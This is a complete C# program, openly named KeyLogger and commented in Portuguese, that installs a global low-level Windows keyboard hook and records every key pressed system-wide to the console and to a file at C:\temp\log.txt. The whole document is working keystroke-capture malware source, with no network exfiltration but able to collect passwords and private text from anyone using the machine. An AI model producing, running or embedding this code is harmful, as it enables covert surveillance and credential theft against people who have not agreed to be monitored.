using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace KeyLogger {
    class Program {
        private const int WH_KEYBOARD_LL = 13; // Definindo o tipo de hook de teclado
        private const int WM_KEYDOWN = 0x0100; // Indicando que uma tecla foi pressionada
        private static LowLevelKeyboardProc _proc = HookCallback; // Executar o código quando uma tecla é pressionada
        private static IntPtr _hookID = IntPtr.Zero; // Identificador do hook de teclado
        private static StreamWriter sw; // Objeto StreamWriter para escrever no arquivo

        static void Main(string[] args) {
            // Abre o arquivo para escrita, e cria um objeto StreamWriter para escrever nele
            sw = new StreamWriter(@"C:\temp\log.txt");
            sw.AutoFlush = true;

            _hookID = SetHook(_proc); // Cria e armazena o identificador do hook de teclado
            Application.Run(); // Inicia a aplicação
            UnhookWindowsHookEx(_hookID); // Remove o hook de teclado

            // Fecha o objeto StreamWriter
            sw.Close();
            sw.Dispose();
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc) {
            // Cria e retorna o identificador do hook de teclado
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule) {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
            // Verifica se uma tecla foi pressionada e chama o código
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
                int vkCode = Marshal.ReadInt32(lParam); // Lê o código virtual da tecla pressionada
                Console.WriteLine((Keys)vkCode); // Escreve o caractere no console
                sw.Write((Keys)vkCode); // Escreve o caractere no arquivo
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam); // Chama o próximo hook
        }

        // Gerenciar os hooks de teclado
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
    }
}
